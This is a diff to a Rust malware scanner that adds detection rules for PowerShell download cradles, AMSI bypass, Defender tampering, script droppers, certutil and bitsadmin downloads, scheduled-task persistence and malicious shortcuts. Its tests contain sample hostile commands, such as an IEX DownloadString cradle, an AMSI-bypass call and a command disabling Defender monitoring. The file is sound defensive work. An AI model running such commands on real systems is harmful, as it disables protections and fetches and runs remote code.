@@ -117,6 +117,9 @@ impl HeuristicEngine {
 
         // Information stealing patterns
         self.add_stealer_rules();
+
+        // Script, macro-launcher and shortcut techniques
+        self.add_script_rules();
     }
 
     fn add_malware_rules(&mut self) {
@@ -262,13 +265,158 @@ impl HeuristicEngine {
             id: "HEUR_501".to_string(),
             name: "File Encryption Pattern".to_string(),
             description: "Detects patterns indicative of file encryption (ransomware)".to_string(),
-            pattern: Regex::new(r"\.(encrypted|locked|crypto|Encrypted|Locked)\b|YOUR_FILES_ARE_ENCRYPTED|DECRYPT_INSTRUCTIONS")
+            pattern: Regex::new(r#"[A-Za-z0-9_\-]\.(encrypted|locked|crypto|Encrypted|Locked)(?:$|[\s"'\x00,;)\]])|YOUR_FILES_ARE_ENCRYPTED|DECRYPT_INSTRUCTIONS"#)
                 .unwrap(),
             severity: HeuristicSeverity::Critical,
             confidence: 0.9,
             file_types: vec!["*".to_string()],
             context_extractor: Some(extract_ransomware_context),
         });
+    }
+
+    fn add_script_rules(&mut self) {
+        // Each pattern names a specific attacker technique and requires the
+        // surrounding context, not a single word: "Invoke-Expression" or
+        // "WScript.Shell" alone appear in ordinary admin scripts. Checked for
+        // false positives against Pester, PSScriptAnalyzer, jQuery and
+        // Bootstrap (benchmark clean sources).
+        const PS: &[&str] = &[
+            "ps1", "psm1", "psd1", "bat", "cmd", "lnk", "hta", "vbs", "js", "wsf",
+        ];
+        const WSH: &[&str] = &["js", "jse", "vbs", "vbe", "wsf", "wsh", "hta"];
+        const ANY_SCRIPT: &[&str] = &[
+            "ps1", "psm1", "psd1", "bat", "cmd", "lnk", "hta", "vbs", "vbe", "js", "jse", "wsf",
+            "wsh",
+        ];
+        let mut add = |id: &str,
+                       name: &str,
+                       description: &str,
+                       pattern: &str,
+                       severity: HeuristicSeverity,
+                       types: &[&str]| {
+            self.rules.push(HeuristicRule {
+                id: id.to_string(),
+                name: name.to_string(),
+                description: description.to_string(),
+                pattern: Regex::new(pattern).expect("script rule pattern"),
+                severity,
+                confidence: 0.8,
+                file_types: types.iter().map(|t| t.to_string()).collect(),
+                context_extractor: None,
+            });
+        };
+
+        // ── PowerShell ─────────────────────────────────────────────────
+        add(
+            "SCRIPT_101",
+            "PowerShell download and execute",
+            "Downloads code and runs it in memory (a download cradle)",
+            r"(?i)(\biex\b|invoke-expression)[^\n]{0,200}(downloadstring|downloaddata|net\.webclient|invoke-webrequest|invoke-restmethod|\biwr\b|\birm\b)|(downloadstring|downloaddata|invoke-webrequest|invoke-restmethod|\biwr\b|\birm\b)[^\n]{0,200}(\|\s*iex\b|invoke-expression)",
+            HeuristicSeverity::High,
+            PS,
+        );
+        add(
+            "SCRIPT_102",
+            "PowerShell encoded command",
+            "Starts PowerShell with a base64-encoded command line",
+            r"(?i)powershell(\.exe)?[^\n]{0,120}\s[-/]e(nc|ncodedcommand|c)?\s+[A-Za-z0-9+/=]{40,}",
+            HeuristicSeverity::High,
+            ANY_SCRIPT,
+        );
+        add(
+            "SCRIPT_103",
+            "Hidden PowerShell launch",
+            "Starts PowerShell with a hidden window and no profile or policy",
+            r"(?i)powershell(\.exe)?[^\n]{0,80}\s[-/]w(indowstyle)?\s+h(idden)?\b",
+            HeuristicSeverity::Medium,
+            ANY_SCRIPT,
+        );
+        add(
+            "SCRIPT_104",
+            "AMSI bypass",
+            "Disables Windows' Antimalware Scan Interface",
+            r"(?i)amsiInitFailed|AmsiUtils|AmsiScanBuffer|amsi\.dll",
+            HeuristicSeverity::High,
+            ANY_SCRIPT,
+        );
+        add(
+            "SCRIPT_105",
+            "In-memory assembly from base64",
+            "Decodes base64 and loads it as a .NET assembly",
+            r"(?i)FromBase64String[^\n]{0,300}\]::Load\(|\]::Load\([^\n]{0,300}FromBase64String",
+            HeuristicSeverity::High,
+            PS,
+        );
+        add(
+            "SCRIPT_106",
+            "Defender tampering",
+            "Turns off Microsoft Defender or excludes paths from it",
+            r"(?i)(Set|Add)-MpPreference[^\n]{0,120}-(DisableRealtimeMonitoring|DisableIOAVProtection|DisableBehaviorMonitoring|ExclusionPath|ExclusionProcess|ExclusionExtension)",
+            HeuristicSeverity::High,
+            ANY_SCRIPT,
+        );
+        add(
+            "SCRIPT_107",
+            "Character-code obfuscation",
+            "Builds code from long runs of character codes",
+            r"(?i)(\[char\]\s*\(?\s*0?x?[0-9a-f]{2,3}\s*\)?\s*[+,]\s*){12,}|(chrw?\(\s*\d{2,3}\s*\)\s*&\s*){12,}|fromCharCode\((\s*\d{2,3}\s*,){16,}",
+            HeuristicSeverity::Medium,
+            ANY_SCRIPT,
+        );
+
+        // ── Windows Script Host (JScript, VBScript, HTA) ───────────────
+        add(
+            "SCRIPT_201",
+            "Script downloads a file to disk",
+            "Fetches a URL and writes the response with ADODB.Stream",
+            r"(?is)(MSXML2\.(Server)?XMLHTTP|WinHttp\.WinHttpRequest|Microsoft\.XMLHTTP).{0,3000}ADODB\.Stream|ADODB\.Stream.{0,3000}(MSXML2\.(Server)?XMLHTTP|WinHttp\.WinHttpRequest|Microsoft\.XMLHTTP)",
+            HeuristicSeverity::High,
+            WSH,
+        );
+        add(
+            "SCRIPT_202",
+            "Script runs commands",
+            "Creates WScript.Shell or Shell.Application and runs a program",
+            r"(?is)(ActiveXObject|CreateObject|GetObject)\(\s*[\x22']?(WScript\.Shell|Shell\.Application)[\x22']?\s*\).{0,1500}\.(Run|Exec|ShellExecute)\b",
+            HeuristicSeverity::Medium,
+            WSH,
+        );
+        add(
+            "SCRIPT_203",
+            "Decode-then-eval",
+            "Evaluates code that is decoded or unescaped at run time",
+            r"(?i)\beval\s*\(\s*(unescape|atob|decodeURIComponent|String\.fromCharCode)\s*\(|\bExecute(Global)?\s*\(?\s*(StrReverse|Replace|Chr)\s*\(",
+            HeuristicSeverity::High,
+            WSH,
+        );
+
+        // ── Living-off-the-land binaries, from any script or shortcut ──
+        add(
+            "SCRIPT_301",
+            "Windows tool used to download or decode",
+            "certutil, bitsadmin, mshta, regsvr32 or rundll32 used to fetch or run remote code",
+            r"(?i)\bcertutil(\.exe)?\b[^\n]{0,80}[-/](urlcache|decode)|\bbitsadmin(\.exe)?\b[^\n]{0,80}/transfer|\bmshta(\.exe)?\b[^\n]{0,60}(https?:|javascript:|vbscript:)|\bregsvr32(\.exe)?\b[^\n]{0,80}/i:\s*https?:|\brundll32(\.exe)?\b[^\n]{0,80}javascript:",
+            HeuristicSeverity::High,
+            ANY_SCRIPT,
+        );
+        add(
+            "SCRIPT_302",
+            "Scheduled task or Run key persistence",
+            "Registers a scheduled task or a Run key from a script",
+            r"(?i)\bschtasks(\.exe)?\b[^\n]{0,60}/create|\breg(\.exe)?\s+add\s+[^\n]{0,40}\\CurrentVersion\\Run\b",
+            HeuristicSeverity::Medium,
+            ANY_SCRIPT,
+        );
+
+        // ── Shortcuts ──────────────────────────────────────────────────
+        add(
+            "SCRIPT_401",
+            "Shortcut launches a script host",
+            "A .lnk file that starts PowerShell, cmd, mshta or a script host",
+            r"(?i)\b(powershell|pwsh|mshta|wscript|cscript|conhost)(\.exe)?\b|\bcmd(\.exe)?\s+/[ck]\b",
+            HeuristicSeverity::Medium,
+            &["lnk"],
+        );
     }
 
     fn add_stealer_rules(&mut self) {
@@ -279,7 +427,7 @@ impl HeuristicEngine {
             id: "HEUR_602".to_string(),
             name: "Browser Data Theft".to_string(),
             description: "Detects attempts to steal browser data".to_string(),
-            pattern: Regex::new(r"(?i)(Chrome\\User Data|Firefox\\Profiles|Opera\\|Safari\\)")
+            pattern: Regex::new(r"(?i)(Google\\Chrome\\User Data|Microsoft\\Edge\\User Data|BraveSoftware\\Brave-Browser\\User Data|Mozilla\\Firefox\\Profiles|Opera Software\\Opera (Stable|GX Stable)|\\Login Data\b|\\Local State\b)")
                 .unwrap(),
             severity: HeuristicSeverity::High,
             confidence: 0.75,
@@ -770,5 +918,114 @@ mod tests {
             .await
             .unwrap();
         assert!(matches.iter().all(|m| m.rule_id != "HEUR_003"));
+    }
+
+    async fn ids(content: &str, name: &str) -> Vec<String> {
+        let engine = HeuristicEngine::new();
+        let mut v: Vec<String> = engine
+            .analyze_content(content, Path::new(name))
+            .await
+            .unwrap()
+            .into_iter()
+            .map(|m| m.rule_id)
+            .collect();
+        v.sort();
+        v.dedup();
+        v
+    }
+
+    #[tokio::test]
+    async fn powershell_techniques_are_recognised() {
+        let cradle = "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')";
+        assert!(ids(cradle, "a.ps1")
+            .await
+            .contains(&"SCRIPT_101".to_string()));
+        let piped = "iwr http://example.invalid/a -UseBasicParsing | iex";
+        assert!(ids(piped, "a.ps1")
+            .await
+            .contains(&"SCRIPT_101".to_string()));
+        let enc = format!(
+            "powershell.exe -nop -w hidden -enc {}",
+            "SQBFAFgA".repeat(8)
+        );
+        let found = ids(&enc, "run.bat").await;
+        assert!(
+            found.contains(&"SCRIPT_102".to_string()) && found.contains(&"SCRIPT_103".to_string())
+        );
+        assert!(ids(
+            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
+            "a.ps1"
+        )
+        .await
+        .contains(&"SCRIPT_104".to_string()));
+        assert!(
+            ids("Set-MpPreference -DisableRealtimeMonitoring $true", "a.ps1")
+                .await
+                .contains(&"SCRIPT_106".to_string())
+        );
+    }
+
+    #[tokio::test]
+    async fn wsh_and_lolbin_techniques_are_recognised() {
+        let dropper = r#"var x = new ActiveXObject("MSXML2.XMLHTTP"); x.open("GET", u, false);
+            var s = new ActiveXObject("ADODB.Stream"); s.SaveToFile(p, 2);"#;
+        assert!(ids(dropper, "a.js")
+            .await
+            .contains(&"SCRIPT_201".to_string()));
+        let runner = r#"Set sh = CreateObject("WScript.Shell")
+            sh.Run "cmd /c calc", 0"#;
+        assert!(ids(runner, "a.vbs")
+            .await
+            .contains(&"SCRIPT_202".to_string()));
+        assert!(ids("eval(unescape('%61%6c%65%72%74'))", "a.js")
+            .await
+            .contains(&"SCRIPT_203".to_string()));
+        assert!(ids(
+            "certutil -urlcache -split -f http://example.invalid/a.exe a.exe",
+            "a.bat"
+        )
+        .await
+        .contains(&"SCRIPT_301".to_string()));
+        assert!(ids("schtasks /create /sc minute /tn x /tr a.exe", "a.cmd")
+            .await
+            .contains(&"SCRIPT_302".to_string()));
+    }
+
+    #[tokio::test]
+    async fn ordinary_scripts_stay_quiet() {
+        // Admin and library code that uses the same building blocks legitimately.
+        let admin = r#"$r = Invoke-WebRequest -Uri $Url -OutFile $Path
+            Invoke-Expression -Command $Command
+            $bytes = [Convert]::FromBase64String($b64)
+            Set-MpPreference -SignatureUpdateInterval 4
+            $shell = New-Object -ComObject WScript.Shell"#;
+        assert!(ids(admin, "deploy.ps1")
+            .await
+            .iter()
+            .all(|i| !i.starts_with("SCRIPT_")));
+        let lib = "function locked() { return !!locked; } var t = eval('(' + json + ')');";
+        assert!(ids(lib, "lib.js")
+            .await
+            .iter()
+            .all(|i| !i.starts_with("SCRIPT_")));
+        let css_map =
+            r#"{"sources":["../../scss/mixins/_reboot.scss"],"names":["Safari\\","Opera\\"]}"#;
+        assert!(ids(css_map, "bootstrap.css.map").await.is_empty());
+    }
+
+    #[tokio::test]
+    async fn shortcut_text_is_read_from_utf16() {
+        let mut lnk = vec![0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00];
+        lnk.extend([0u8; 68]);
+        for u in "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden"
+            .encode_utf16()
+        {
+            lnk.extend(u.to_le_bytes());
+        }
+        let text = crate::analyzers::heuristic_text(&lnk);
+        assert!(text.contains("powershell.exe -w hidden"));
+        let found = ids(&text, "invoice.pdf.lnk").await;
+        assert!(found.contains(&"SCRIPT_401".to_string()));
+        assert!(found.contains(&"SCRIPT_103".to_string()));
     }
 }
